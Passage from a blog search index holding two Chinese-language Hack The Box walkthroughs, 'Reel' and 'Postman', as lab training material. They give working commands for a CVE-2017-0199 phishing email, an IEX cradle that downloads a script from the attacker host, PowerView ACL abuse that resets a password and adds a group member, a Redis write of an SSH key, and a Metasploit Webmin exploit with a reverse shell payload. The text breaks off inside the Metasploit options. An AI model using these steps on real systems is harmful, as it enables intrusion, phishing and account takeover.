<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Reel</title>
    <url>/2021/12/24/Reel/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 05:18 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.77</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 9997 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp open  smtp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   Hello: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   NULL: </span><br><span class="line">|_    220 Mail Service ready</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY </span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port25-TCP:V=7.91%I=7%D=11/14%Time=6190E2F5%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,18,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n&quot;</span>)%r(Hello,3A,<span class="string">&quot;220\x20Mail\x20</span></span><br><span class="line"><span class="string">SF:Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n&quot;</span>)</span><br><span class="line">SF:%r(Help,54,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20E</span></span><br><span class="line"><span class="string">SF:HLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n</span></span><br><span class="line"><span class="string">SF:&quot;</span>);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches <span class="keyword">for</span> host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   301.22 ms 10.10.14.1</span><br><span class="line">2   301.21 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 185.69 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>发现开放了21端口，可以匿名登录，并且在documents目录下发现了两个docx文件，我们将其下载下来并使用exiftool查看内容如下<img src="https://img-blog.csdnimg.cn/15c476e67c4941c6b76d60c03fdede70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>readme.txt文件告诉我们有人正在等待 .rtf 文件并将打开它们进行审查，因为考虑到机器上正在运行 SMTP 服务，这可能是我们的目标，具有网络钓鱼攻击。<br><img src="https://img-blog.csdnimg.cn/c858f787033a4c5b8a8cbbe73d598b86.png" alt="在这里插入图片描述"></p>
<p>查阅官方文档发现，AppLocker可以阻止可执行文件和脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AppLocker procedure to be documented - <span class="built_in">hash</span> rules <span class="keyword">for</span> exe, msi and scripts  (ps1,vbs,cmd,bat,js) are <span class="keyword">in</span> effect.</span><br></pre></td></tr></table></figure>

<p>我们发现Windows Event Forwarding.docx这个文件中存在一个邮箱地址<code>nico@megabank.com</code><br><img src="https://img-blog.csdnimg.cn/14102687e160477884fd2f3e6c8910a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>根据刚刚readme.txt的文件内容，我们可以尝试将rtf文件发送到这个地址上，我们从application字段中发现我们可以使用word文档的方式进行创建。并且我们在网上搜索看到，关于rtf文件漏洞利用是已经披露的漏洞编号<code>CVE-2017-0199</code>，此漏洞允许创建恶意 rtf 文档，在打开文档时启动 HTA（超文本应用程序)有效负载，Github 上有一个用于制作利用此漏洞的恶意文档的 Python 工具包，但也有一个 Metasploit 模块，我仍然将使用 Python 脚本。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先我们创建一个hta的载荷<br><img src="https://img-blog.csdnimg.cn/b6c156c3e5e84eebb3b7207a29673574.png" alt="在这里插入图片描述"><br>本地开启http服务器<br><img src="https://img-blog.csdnimg.cn/ebf7fdbfa46043bb84f2a0e1c331c6c7.png" alt="在这里插入图片描述"></p>
<p>然后利用这个hta脚本，创建rtf文件<br><img src="https://img-blog.csdnimg.cn/bf21d9b792054d399fe94052c21c3129.png" alt="在这里插入图片描述"><br>最后发送钓鱼邮件进行获取权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u Test -m <span class="string">&quot;Hey, take a look at this new format procedure&quot;</span> -a document.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f64aa5ef2a984a4e92fd8dfed197da16.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发送钓鱼邮件并开启监听，我们得到了nico账户的用户权限<br><img src="https://img-blog.csdnimg.cn/6965f266fe7341beb4fd71506ff9335b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权到TOM权限"><a href="#提权到TOM权限" class="headerlink" title="提权到TOM权限"></a>提权到TOM权限</h2><p>我们从Nico账户的桌面上看到一个cred.xml文件，文件内容包含了password字段内容<br><img src="https://img-blog.csdnimg.cn/b971324dcaa14613a8d91aa6b4997923.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>PowerShell 有一个称为 PSCredential 的对象，它提供了一种存储用户名、密码和凭据的方法。还有两个函数Import-CliXml和Export-CliXml，用于将这些凭据保存到文件中并从文件中恢复它们。该文件是Export-CliXml，我们发现Tom的密码是<code>1ts-mag1c!!!</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\nico\Desktop&gt;powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line"></span><br><span class="line">UserName       : Tom</span><br><span class="line">Password       : 1ts-mag1c!!!</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : HTB</span><br></pre></td></tr></table></figure>

<p>因为目标主机开放了22端口，因此我们可以连接主机的远程服务<br><img src="https://img-blog.csdnimg.cn/c0ef87585054476281e5aa1595fa284e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在tom的桌面的AD audit文件夹下发现了一个有趣的文件内容，还有一个BloodHound文件夹<br><img src="https://img-blog.csdnimg.cn/67be2e3fd4494a14bc46cd3a6af8eb45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e9b9cfa8736d42788e6f32b6d3b628fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>经过查阅文章发现，bloodhound通过csv文件形式保存文件的，都是2.0版本以前的了，那么我们现在有两个选择，一个是在目标主机上安装旧版本的bloodhound，二是将收集到的数据上传到我们攻击机上进行分析，我选择的是第二种方式。</p>
<p>首先我们将目标的脚本加载到内存中，绕过powershell的策略限制。收集到的信息保存在当前目录的一个压缩包中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.7/sharphound/SharpHound.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/44243984d10a4293a08aebd5b9748298.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>为了传输方便，我们在本地开启smb服务<br><img src="https://img-blog.csdnimg.cn/65746cbe84ba4b048fb124b74a55a741.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在攻击机上开启bloodhound后，将压缩包拖进去进行分析，点击<code>Shortest Paths to High Value Targets</code>。为了方便筛选，我们选择tom到admin的提权路径和nico到admin的路径进行分析<br><img src="https://img-blog.csdnimg.cn/29bd464348754983b4412b33ca42a996.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/399172cccb7243948e1b64abf136697b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我知道 claire 对 Backup_Admins 组具有 WriteDacl 权限。我可以用它把她加到群里，但是事先我们先得连接到claire这个用户上。</p>
<h2 id="提权到Administrator"><a href="#提权到Administrator" class="headerlink" title="提权到Administrator"></a>提权到Administrator</h2><p>首先，我们将自己设置为 claire 帐户的所有者，以便我们可以更改她的属性；然后我们更改 claire AD 对象的访问控制列表 (ACL) 以授予我们自己 (Tom) 重置 claire 密码的权限；然后我们为该帐户选择一个新密码并将其转换为 SecureString 格式，这就是 PowerShell 用于密码的格式；我们可以使用我们选择的一个更改 claire 的密码；为了将用户添加到组，我们必须提供有效的用户凭据，因此我们声明一个 PSCredential 对象来包含 claire 的用户名和密码，因为她是对 Backup_Admins 组具有写访问权限的人；最后我们使用它来将自己添加到 Backup_Admins 组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; import-module .\PowerView.ps1</span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt;  Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                         </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword  </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$password</span>= ConvertTo-SecureString <span class="string">&#x27;Password_123!&#x27;</span> -AsPlainText -Force              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainUserPassword -Identity claire -AccountPassword <span class="variable">$password</span>                 </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$creds</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\claire&#x27;</span>,<span class="variable">$passwor</span></span><br><span class="line">d)                                                                                                                              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-DomainGroupMember -Identity <span class="string">&#x27;Backup_Admins&#x27;</span> -Members <span class="string">&#x27;claire&#x27;</span> -Credential <span class="variable">$cred</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure>

<p>whoami /all查看到我们已经处于backup_admins组中了<br><img src="https://img-blog.csdnimg.cn/9ff1c27957d54fe3b71bfa62126f58b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们还是无法查看root.txt的内容，我们却可以查看<code>Backup Scripts</code>的内容<br><img src="https://img-blog.csdnimg.cn/b4491a3626c84023b3f122732aa44800.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们在<code>BackupScript.ps1</code>中找到管理员的密码<br><img src="https://img-blog.csdnimg.cn/3285fc7c314a4f98840bb0bc74f27320.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>直接登录管理员账号<br><img src="https://img-blog.csdnimg.cn/f96c6ddacbff4775947400c9dfd03743.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>邮箱钓鱼</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Postman(Redis未授权访问)</title>
    <url>/2021/12/24/Postman/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标开放了22、80、6379等常见端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root💀kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">└─<span class="comment"># ./nmap.sh 10.10.10.160</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 07:32 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 42.85 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>我们访问一下web服务，发现只是一个普通的web页面而已<img src="https://img-blog.csdnimg.cn/31925c3c4c634d4c8dfa4491466b77e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们模糊一下网站路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://10.10.10.160&quot; -e * -x404,403,500</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                        </span><br><span class="line">                                                                                                                                               </span><br><span class="line">Extensions: nmap.sh | HTTP method: GET | Threads: 30 | Wordlist size: 8979</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/10.10.10.160/_21-11-30_07-47-35.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-21-11-30_07-47-35.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.160/</span><br><span class="line">                                                                                                                                               </span><br><span class="line">[07:47:35] Starting: </span><br><span class="line">[07:48:35] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                                             </span><br><span class="line">[07:48:44] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                                             </span><br><span class="line">[07:48:48] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/                        </span><br><span class="line">[07:48:48] 200 -    2KB - /images/</span><br><span class="line">[07:48:50] 200 -    4KB - /index.html                                                                                                 </span><br><span class="line">[07:48:51] 200 -    3KB - /js/                                                                                                              </span><br><span class="line">[07:48:52] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                   </span><br><span class="line">[07:49:25] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/                                                                       </span><br><span class="line">[07:49:27] 200 -    8KB - /upload/                                                                          </span><br><span class="line">                                                                                                                       </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<!--more-->

<p>我们发现一个upload目录，访问发现只有一些图片而已<br><img src="https://img-blog.csdnimg.cn/b3c145006edb4713a933104a79cae707.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>web攻击无果，那我们将注意力转移到redis数据库上，尝试是否存在未授权访问漏洞<br><img src="https://img-blog.csdnimg.cn/f8887a8690934a50aefef93ab24f104a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们首先将我们的ssh-key写入到key.txt文件中<br><img src="https://img-blog.csdnimg.cn/30cc35f7466642ae8fc852db4f111dc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再把key.txt文件内容写入redis缓存中<br><img src="https://img-blog.csdnimg.cn/3f83ac49ad7546059774aba3c56a198e.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.160:6379&gt; config get dir</span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/var/lib/redis&quot;</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> /var/lib/redis/.ssh</span><br><span class="line">(error) ERR Wrong number of arguments <span class="keyword">for</span> CONFIG <span class="built_in">set</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>我们尝试登录到该主机上<br><img src="https://img-blog.csdnimg.cn/795ba910f639419d8987d79f0ec483b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们上传linpeas.sh脚本到目标主机上发现，主机的/opt目录上存在一份私钥备份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis@Postman:~$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>我们将其下载到本机，并使用ssh2john.py将其哈希导出<br><img src="https://img-blog.csdnimg.cn/66c4d071bea24d2bb4891441037f3a8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后使用john进行破解得到密码，得到密码computer2008，登录到Matt账户<br><img src="https://img-blog.csdnimg.cn/40e53a09c8a549a19313e7fb22d13443.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>我们访问10000端口发现是个webmin应用程序，在EDB发现存在RCE漏洞并在MSF中集成<br><img src="https://img-blog.csdnimg.cn/83ea6c04c24c457e896f109ef6a6cfbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ae16ec96fd1d44ceac7112af658419af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们直接使用第二个并填写好参数后，得到root权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use 2</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             